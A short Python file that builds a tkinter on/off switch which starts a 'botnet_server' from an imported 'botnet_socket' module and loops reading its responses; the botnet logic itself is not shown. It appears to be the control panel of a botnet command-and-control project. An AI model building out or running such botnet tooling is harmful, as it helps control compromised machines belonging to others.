from tkinter import *
from PIL import Image
from botnet_socket.botnet_server import *
import threading
import socket

root = Tk()
root.title('SERVER')
root.geometry("500x300")

# Keep track of the button state on/off
#global is_on
is_on = False

# Create Label
my_label = Label(root, 
	text="The Switch Is Off!", 
	fg="gray", 
	font=("Helvetica", 32))

my_label.pack(pady=20)


# Define our switch function
def switch():
	global is_on

	# Determine is on or off
	if is_on:
		on_button.config(image=off)
		my_label.config(text="The Switch is Off", fg="grey")
		is_on = False
	else:
		on_button.config(image=on)
		my_label.config(text="The Switch is On", fg="green")
		is_on = True
		t1 = threading.Thread(target=turn_on, args=[])
		t1.start()

def get_host_ip():
	hostname = socket.gethostname()
	local_ip = socket.gethostbyname(hostname)
	return local_ip

def turn_on():
	global is_on
	sv = botnet_server(host = get_host_ip())
	sv.run_server()
	while True:
		t = sv.response_msg()
		if not t or not is_on:
			break

# Define Our Images
on = PhotoImage(file='images/on.png')
off = PhotoImage(file='images/off.png')

# Create A Button
on_button = Button(root, image=off, bd=0, command=switch)
on_button.pack(pady=50)

root.mainloop()
